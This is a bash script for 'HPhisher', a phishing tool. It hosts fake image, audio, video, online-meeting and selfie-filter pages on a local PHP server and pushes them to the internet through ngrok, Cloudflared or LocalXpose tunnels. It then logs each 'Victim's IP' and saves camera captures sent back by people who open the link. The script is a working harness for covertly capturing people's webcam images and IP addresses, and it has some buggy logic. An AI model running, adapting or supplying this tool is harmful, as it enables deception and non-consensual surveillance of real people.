##COLOUR VARIABLES
#Text
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd) #project directory
files_dir="${pro_dir}/files"
server_dir="${pro_dir}/.server" #server directory
sites_dir="${pro_dir}/.sites" #sites directory

#Time
date=$(date +%d-%m-%Y)
time=$(date +%H-%M-%S)
logs_dir=$(date +%d-%m-%Y-%H-%M-%S)

#Normal Banner
banner(){
	echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}        ${NC} "
}
# Credits banner
cbanner(){
  echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
	echo -e "${CYAN}        ${NC} "
	echo -e "${RED}                           Version 1.0 ${NC}"
	echo -e "${CYAN}        ${NC} "
}
#Small Banner
sbanner(){
	echo " "
	echo -e "${GREEN} ▒█░░▒█${BLUE} ▒█▀▀█ ${NC}"
	echo -e "${GREEN} ▒█▒░▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
	echo -e "${GREEN} ▒█████${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
	echo -e "${GREEN} ▒█░░░█${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
	echo -e "${CYAN}        ${NC} "
}

## Directories
directories(){
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
if [[ ! -d "files" ]]; then
        mkdir -p "files"
fi
if [[ ! -d "files/audio" ]]; then
        mkdir -p "files/audio"
fi
if [[ ! -d "files/video" ]]; then
        mkdir -p "files/video"
fi
if [[ ! -d "files/image" ]]; then
        mkdir -p "files/image"
fi
}

#Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "hphisher.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 hphisher.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
check_update() {
	rm -rf version.txt
	rm -rf core/update/tmp/version.txt

	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/core/update/version.txt > /dev/null 2>&1
	mv version.txt core/update/tmp

	current_ver=$( cat core/update/version.txt )
	lat_ver=$( cat core/update/tmp/version.txt )
	if [ $current_ver == $lat_ver ]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		{ sleep 3; clear; mainmenu; }
	else
		echo " "
		echo "${GREEN} Current version = ${YELLOW} $current_ver "
		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
		case $ureply in
			Y | y)
				update;;
			N | n)
				{ clear;  mainmenu; };;

		esac
	fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/hphisher
	if [ -e .server/ngrok ]; then
		mv .server/ngrok $HOME/hphisher
	fi
	if [ -e .server/cloudflared ]; then
        	mv .server/cloudflared $HOME/hphisher
	fi

	cd ..
	rm -rf HPhisher
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/Alygnt/HPhisher

	if [ -d HPhisher ]; then
		cd HPhisher
	        mv $HOME/hphisher/ngrok .server
	        mv $HOME/hphisher/cloudflared .server
	        rm -rf $HOME/hphisher
	        credits_banner
		echo " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash hphisher.sh
		echo  " "
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}

HOST='127.0.0.1'
PORT='4444'

## Shortcut
shortut_check() {
	if [[ -s "/bin/hphisher" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Shortcut is active."
	else
		shortcut
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                ngrok_token_setup
        fi
}

ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
               mkdir $HOME/.ngrok2
               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
        fi

        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
               rm -rf ${HOME}/.ngrok2/ngrok.yml
	       echo -e "\n"
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               authline="authtoken : ${ntoken}"
               echo "$authline" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        else
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               echo "authtoken : ${ntoken}" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        fi

}

## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
        ngrok_token_check
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }
        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
        echo -e "\n ${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN} $ngrok_url"
        capture_data_check
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }

        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}$cldflr_link"
        capture_data_check
}

## Install LocalXpose
install_loclx() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

auth_loclx() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose
start_loclx() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; auth_loclx; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner; }
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}http://$loclx_url"
	capture_data_check
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data_check
}

setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        cp -rf .sites/"$site_name"/"$site_template"/* .server/www
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

#Capture data check
capture_data_check(){
	if [ site_name=image ];then
                capture_data_image
        elif [ site_name=audio ];then
                capture_data_audio
        elif [ site_name=video ];then
                capture_data_video
	elif [ site_name=video ];then
	        capture_data_video_audio
	else
	    	echo " Error Occured!!"
        fi
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\n${RED} Victim's IP : ${RED}$IP"
	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
	mkdir ${logs_dir}
	mv ${logs_dir} ${files_dir}/${site_name}
        echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}/ip.txt"
	mv .server/www/ip.txt ${logs_full_dir}
}
capture_data_image() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
  	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
			echo " "
                        printf "${GREEN} Cam file received! ${NC}"
                        rm -rf .server/www/Log.log
			mv .server/www/*.png  ${logs_full_dir}/
                fi
                sleep 0.5
	done
}

capture_data_audio() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
  while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
                        printf "${GREEN} Cam file received! ${NC}"
                        rm -rf Log.log
                        mv /.server/www/*.{jpg,jpeg,webp,png} /sdcard
                fi
                sleep 0.5
	done
}

capture_data_video() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
  while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
                        printf "${GREEN} Cam file received! ${NC}"
                        rm -rf Log.log
                        shopt -s globstar 
                        for f in /.server/www/*.{jpg,jpeg,webp}; do
                        mv -- "/.server/www/${f}" /${files_dir}
                        done
                fi
                sleep 0.5
	done
}

mainmenu() {
echo -e " "
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " "
echo -e "${RED} CHOOSE A SITE : ${NC}"
echo -e " "
echo -e " "
echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
echo -e "${BLUE} [3] ${GREEN} Video ${NC}"
echo -e "${BLUE} [4] ${GREEN} Video+Audio ${NC}"
echo -e " "
echo -e "${BLUE} [A] ${RED} About ${NC}"
echo -e "${BLUE} [B] ${RED} Request A site ${NC}"
echo -e "${BLUE} [C] ${RED} Report an Issue ${NC}"
echo -e "${BLUE} [D] ${RED} View Logs ${NC}"
echo -e "${BLUE} [E] ${RED} Check for Updates ${NC}"
echo -e "${BLUE} [00] ${RED} Exit ${NC}"
echo -e " "
read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
echo " "
case $reply_site in
        1 | 01)
		site_name=image
                site_image;;
        2 | 02)
		site_name=audio
                site_audio;;
	3 | 03)
		site_name=video
                site_video;;
	A | a)
		xdg-open https://github.com/HPhisher/NPhisher
		{ sleep 2; clear;  banner; mainmenu; };;
	B | b | C | c)
	  	xdg-open https://github.com/HPhisher/NPhisher/issues/new
		{ sleep 2; clear; banner; mainmenu; };;
	D | d)
	    	if [ -f logs.dat ];then
			cat logs.dat
		else
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
			{ sleep 2; clear; mainmenu; }
		fi;;
	E | e)
		check_update;;
	0 | 00)
    		msg_exit;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; mainmenu; };;
esac
}

## Tunnel selection
tunnel_menu() {
echo -e " "
echo -e "${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
echo -e " "
echo -e "	${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "	${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
echo -e "	${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
echo -e "	${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
echo -e " "
read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel

        case $reply_tunnel in
                1 | 01)
                        start_localhost;;
                2 | 02)
			install_ngrok
			start_ngrok;;
                3 | 03)
			install_cloudflared
			start_cloudflared;;
           	4 | 04)
			install_loclx
			start_loclx;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; tunnel_menu; };;
        esac
}

site_image(){
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Default ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
        1 | 01)
                site_template="default"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_image; };;
esac
}

site_audio(){
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Default ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
        1 | 01)
                site_template="default"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_audio; };;
esac
}

site_video(){
duration=5000
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Default ${NC}"
echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
        1 | 01)
                site_template="default"
                tunnel_menu;;
	2 | 02)
		site_template="onlinemeet"
                tunnel_menu;;
	3 | 03)
		site_template="filter"
		tunnel_menu;;
	d | D)
		echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
		site_video;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_video; };;
esac
}


clear
cbanner
directories
kill_pid
dependencies
xpermission
clear
mainmenu
